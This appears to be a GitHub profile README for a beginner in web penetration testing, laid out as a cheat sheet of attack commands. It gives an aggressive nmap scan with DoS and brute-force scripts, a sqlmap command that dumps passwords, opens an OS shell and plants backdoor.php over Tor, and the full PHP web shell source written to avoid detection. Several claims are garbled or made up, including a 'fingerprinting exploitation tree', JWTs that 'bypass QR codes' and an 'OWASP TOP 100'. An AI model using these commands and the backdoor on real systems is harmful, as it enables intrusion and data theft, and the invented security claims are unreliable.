

## Space-code


 # - 🌱📈💹 ** I’m currently learning Web Penetration Testing and Bug Bounty hunting. **

 ## Commands I use (if you come from another platform) FOR YOU


-----

### **Initial Reconnaissance and Vulnerability Analysis**

First, you need to gather information about your target. This involves using various tools to scan for open ports, services, and potential vulnerabilities.

**1. Nmap Scan**

This command performs a comprehensive and aggressive scan on the target, checking for open ports, identifying services and their versions, detecting the operating system, and running various vulnerability and enumeration scripts.

```bash
nmap -A -O -v -Pn -A -T4 --reason -sS -sU -sV -p- --script='default, vuln,http-enum,http-vuln*,ftp-vsftpd-backdoor,ssh2-enum-algos,smb-vuln*,ssl-*,vulners, brute,http-form-fuzzer, dos,http*' target.com
```

**Section LL: TCP/IP Fingerprinting & Exploitation Tree**

Based on the Nmap findings from the `-O` flag, you can identify the operating system and its TCP/IP stack behavior, which can lead to specific attack vectors:

  * **A = Z, ACK = 0**: This can indicate a desync injection or TCP smuggling vulnerability.
  * **S = A, SACK + ECN**: Can lead to an external kernel DoS.
  * **W = 7FFF, No Window Scaling**: This is indicative of a slowloris-style DoS attack.
  * **U1(R = N), IE(R = N)**: No firewall detected. Use Burp Collaborator and fuzz freely.

-----

### **Web Application Specific Hacking**

For a WordPress site, **WPSCAN** is your go-to tool. Remember that for the best results, you'll want a WPSCAN API key, which you can get for free from their website.

**1. WPSCAN Scan**

This command enumerates various aspects of a WordPress site, including plugins (`ap`), themes (`vt`), user accounts (`u1-10`), and security tokens (`at`), using an aggressive detection mode.

```bash
wpscan --enumerate ap --enumerate vt --enumerate at  --enumerate u--enumerate u1-10 --detection-mode aggressive --random-user-agent target.com
```

**2. Directory and File Enumeration**

You should always use **Dirsearch** and **Wfuzz** to find hidden directories and files that could contain sensitive information or misconfigurations.

-----

### **SQL Injection Exploitation**

If you've identified a potential SQL injection vulnerability, you can use **SQLMap** to exploit it. This command is highly aggressive and comprehensive, attempting to dump all databases, users, and privileges.

```bash
cd sqlmap-dev/ && sudo python sqlmap.py \
-u "https://target.com/vuln.php?id=1" \
--cookie="SESSIONID=abcdef123456" \
--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
--random-agent \
--level=5 \
--risk=3 \
--threads=10 \
--dbs \
--current-user \
--current-db \
--is-dba \
--roles \
--users \
--passwords \
--privileges \
--hostname \
--os-shell \
--os-pwn \
--os-smbrelay \
--os-bof \
--udf-inject \
--file-read="/etc/passwd" \
--file-write="backdoor.php" \
--file-dest="/var/www/html/backdoor.php" \
--tamper=between,charencode,randomcase,space2comment \
--technique=BEUSTQ \
--fingerprint \
--all \
--batch \
--flush-session \
--time-sec=10 \
--tor \
--tor-type=SOCKS5 \
--dump
```

If successful, this command will attempt to upload a **backdoor.php** file to the server's web root, which gives you a remote command execution shell.

**The backdoor.php file:**

```php
<?php
// Disable error reporting to avoid detection
error_reporting(0); 
if (isset($_REQUEST['cmd'])) { // Check if a command is provided
    $cmd = $_REQUEST['cmd']; // Get the command from the request
    // Execute the command and output the result
    echo "<pre>"; // Use <pre> tags for better formatting of the output
    system($cmd); // Use system(), exec(), shell_exec(), or passthru()
    echo "</pre>";
}
?>
```

-----

### **Subdomain Discovery and Client-Side Analysis**

**1. CRT.SH and HTTpx**

Use this method to discover live subdomains and identify their technologies and status codes.

1.  Clone the crt.sh repository: `git clone https://github.com/az7rb/crt.sh`
2.  Navigate to the crt.sh folder: `cd crt.sh`
3.  Make the script executable: `chmod +x crt.sh`
4.  Install httpx using Go: `go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest`
5.  Find live subdomains: `./crt.sh -d apple.com | httpx -title -tech-detect -status-code | grep 200` (Remember to replace `apple.com` with your target domain).

**Subsection LLL: Client-Side Vulnerabilities**

You can also use your browser's **Chrome DevTools** to analyze client-side code for vulnerabilities. Inspect the JavaScript files, look for hardcoded API keys, exposed endpoints, or logic flaws. You can then copy and paste the code to me for analysis.

**JWT use can be randomized to bypass even QR codes.** Scan for this to find hidden vulnerabilities.



Working on 
# ** I made WebVirgl pentesting**, 

# - ⚡🥷🛫  My GitHub stats:
                                                                                    
# 167 commits per day
on average ⚡.
 3,022 additions and 60 deletions.   

 codename: seckin

# **- 📬 How to reach me: My email: spacecontributes111@gmail.com**


# History:

- ⚡👨‍🦯 Fun fact: I was a gamedev (Unreal Engine, RTX, cyberpunk-level). With customizable anti aliasing (like AI powered too) but left within 1-3.65 years.
-->


# 🟡😁VULNERABILITIES MY TOOLS COVER👍🟡:

- # OWASP TOP 100!!!

-  solid 
# risk and vulnerability 
indentification,

  along with top notch 
 # **recon**, 

# advanced target implementation 
analysis 

(indirectly),
# enumeration of subdomains, ports, and directories, 

threat/threat surface profiling,

 exploit research, 

# exploitation, and vulnerability 

analysis.

 With HPP (hyper parameter pollution and double

 token checks if I send two requests at the same time, 

is it same token then thats a vuln.).

 Emulating manual Caido/BurpPro Security
- And additionally, INFORMATION GATHERING.


- MY SCRIPT: more:

- Cross-Site Scripting (XSS),

 - # SQL Injection (SQLi), 

- Broken Authentication,

 -  # Broken Access Control, 
- XXE, 

# Security Misconfigurations, and Sensitive Data Exposure 

expert with the WebVirgl tool.
